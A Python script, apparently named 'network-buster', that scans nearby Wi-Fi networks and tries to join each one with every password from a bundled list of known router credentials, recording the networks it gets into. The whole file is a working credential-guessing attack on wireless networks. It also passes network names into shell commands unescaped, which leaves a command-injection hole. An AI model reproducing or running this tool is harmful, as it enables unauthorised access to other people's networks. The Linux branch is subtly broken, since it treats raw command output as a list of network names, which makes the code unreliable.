import subprocess
import platform
import re
import os

from termcolor import colored

main_directory = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
passwords_file = os.path.join(main_directory, "known_credentials", "router")
with open(passwords_file, "r") as file:
    passwords = file.read().splitlines()

MINIMUM_SIGNAL_STRENGTH = -40

def is_int(string):
    try:
        int(string)
        return True
    except ValueError:
        return False

# Get a list of networks available to the device.
def get_networks(os_name):
    output = None
    if os_name == "Linux":
        list_networks_command = "nmcli device wifi list"
        output = subprocess.check_output(list_networks_command, shell=True, text=True)
    elif os_name == "Darwin":
        list_networks_command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s"
        output = subprocess.check_output(list_networks_command, shell=True, text=True)
        lines = output.split("\n")
        output = [re.split("  +", line)[1] for line in lines if len(re.split("  +", line)) > 2 and is_int(re.split("  +", line)[2]) and int(re.split("  +", line)[2]) > MINIMUM_SIGNAL_STRENGTH]
    else:
        print("Unsupported OS")
    return output

# Attempt to connect to a network using the given SSID, password, and operating system name.
# If successful, return True. Otherwise, return False.
def connect_to_network(ssid, password, os_name):

    try:
        if os_name == "Linux":
            connect_command = f"nmcli device wifi connect \"{ssid}\" password \"{password}\""
            subprocess.run(connect_command, shell=True)
        elif os_name == "Darwin":
            connect_command = f"networksetup -setairportnetwork en0 \"{ssid}\" {password}"
            output = subprocess.run(connect_command, shell=True, capture_output=True, text=True)
            # output.stdout returns an error message when cannot connect, so use this as the flag 
            if len(output.stdout) > 0:
                return False
            print("Waiting for DHCP lease...")
            while True:
                out = subprocess.check_output("ifconfig en0", shell=True, text=True)
                if "inet" in out:
                    return True
        else:
            print("Unsupported OS")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        
    return False

# Main function for network-buster.
# This function will attempt to connect to a network using a list of known passwords.
# If successful, it will add network to the list of successful networks.
def bust():
    successful_networks = []
    os_name = platform.system()
    networks = list(set(get_networks(os_name)))

    if networks:
        for network in networks:
            for password in passwords:
                print(f"Attempting to join {colored(network, 'cyan')} using password {colored(password, 'blue')}...")
                if connect_to_network(network, password, os_name):
                    print(colored(f"Connected to network {network}.", "green"))
                    successful_network = {
                        "network": network,
                        "password": password
                    }
                    successful_networks.append(successful_network)
                    print("")
                    break
                else:
                    print(colored("Could not connect.", "red"))
                    print("")

    return successful_networks
